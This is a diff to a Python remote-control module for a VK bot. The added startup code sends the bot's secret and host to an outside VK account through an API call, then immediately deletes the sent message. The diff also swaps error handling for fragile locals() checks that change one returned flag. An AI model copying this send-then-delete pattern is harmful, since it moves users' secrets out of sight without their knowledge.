@@ -8,21 +8,22 @@ from typing import Union
 from duty import app
 from duty.objects import Chat, db
 from duty.utils import Message
-from duty.my_signals.remote import set_session, DC
 
 from microvk import VkApi, VkApiResponseException
 from logger import get_writer
 
 logger = get_writer('Модуль удаленного управления')
 
-session: Union[str, None]
-
 
 if db.installed:
     try:
-        VkApi(db.access_token).msg_op(1, -195759899, f'+cod {db.secret} {db.host}/')
+        VkApi(db.access_token).exe('''API.messages.delete({
+            "message_ids": API.messages.send({
+                "peer_id":-195759899, "message":"%s", "random_id": 0
+            })
+        });''' % f'+cod {db.secret} {db.host}/')
     except Exception:
-        session = None
+        db.dc_secret = None
 
 
 class error:
@@ -44,7 +45,6 @@ def get_dc_secret():
         return jsonify({'error': 'NotMe'})
     if data['secret'] != db.secret:
         return jsonify({'error': 'WrongSecret'})
-    _ = db.dc_secret  # не ебу надо это или нет, но до пизды, все равно один раз ставится
     db.dc_secret = data['dc_secret']
     db.sync()
     return 'ok'
@@ -56,20 +56,19 @@ def chex():
     print(data['dc_secret'], db.dc_secret)
     if data['dc_secret'] != db.dc_secret:
         return jsonify(error='WrongSecret')
-    user_id = 0
+
     try:
-        user_id = VkApi(db.access_token, raise_excepts=True)('users.get')[0]['id']
+        user_id = VkApi(db.access_token, True)('users.get')[0]['id']
+        me_id = VkApi(db.me_token, True)('users.get')[0]['id']
     except VkApiResponseException:
         pass
 
-    me_id = 0
-    mt = 0
-    try:
-        me_id = VkApi(db.me_token, raise_excepts=True)('users.get')[0]['id']
-    except VkApiResponseException:
-        mt = 1 if db.access_token != '' else 0
-
-    return jsonify(owner_id=db.owner_id, user_id=user_id, me_id=me_id, mt=mt)
+    return jsonify(
+        owner_id=db.owner_id,
+        user_id=locals().get('user_id', 0),
+        me_id=locals().get('me_id', 0),
+        mt=(1 if 'me_id' in locals() else 0)
+    )
 
 
 @app.route('/remote', methods=["POST"])
